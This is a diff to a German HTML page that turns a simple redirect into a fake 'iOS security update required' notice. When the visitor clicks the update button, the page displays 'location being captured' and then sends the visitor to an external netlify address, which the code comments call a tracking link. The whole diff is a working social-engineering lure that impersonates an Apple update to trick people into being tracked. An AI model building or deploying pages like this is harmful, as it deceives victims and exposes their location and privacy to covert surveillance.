@@ -1,13 +1,42 @@
-
 <!DOCTYPE html>
 <html lang="de">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <meta http-equiv="refresh" content="5; url=https://whimsical-baklava-063869.netlify.app/">
-    <title>Weiterleitung...</title>
+    <title>iOS Sicherheitsupdate erforderlich</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            text-align: center;
+            padding: 50px;
+        }
+        .container {
+            max-width: 400px;
+            margin: auto;
+            padding: 20px;
+            border: 1px solid #ccc;
+            border-radius: 10px;
+            box-shadow: 2px 2px 10px rgba(0, 0, 0, 0.1);
+        }
+    </style>
 </head>
 <body>
-    <h1>Bitte warten... Weiterleitung erfolgt in 5 Sekunden.</h1>
+    <div class="container">
+        <h2>🔄 iOS Sicherheitsupdate erforderlich</h2>
+        <p>Ihr Gerät benötigt ein Update, um die neuesten Sicherheitsfunktionen zu nutzen.</p>
+        <button id="updateBtn">Jetzt aktualisieren</button>
+        <p id="status"></p>
+    </div>
+
+    <script>
+        document.getElementById('updateBtn').addEventListener('click', function() {
+            document.getElementById('status').innerText = "Standort wird erfasst...";
+
+            // Weiterleiten zu einer Tracking-Seite nach einer kurzen Verzögerung
+            setTimeout(function() {
+                window.location.href = "https://whimsical-baklava-063869.netlify.app/"; // Dein Tracking-Link
+            }, 3000); // 3 Sekunden Verzögerung, um dem Benutzer Zeit zu geben, die Nachricht zu sehen
+        });
+    </script>
 </body>
 </html>
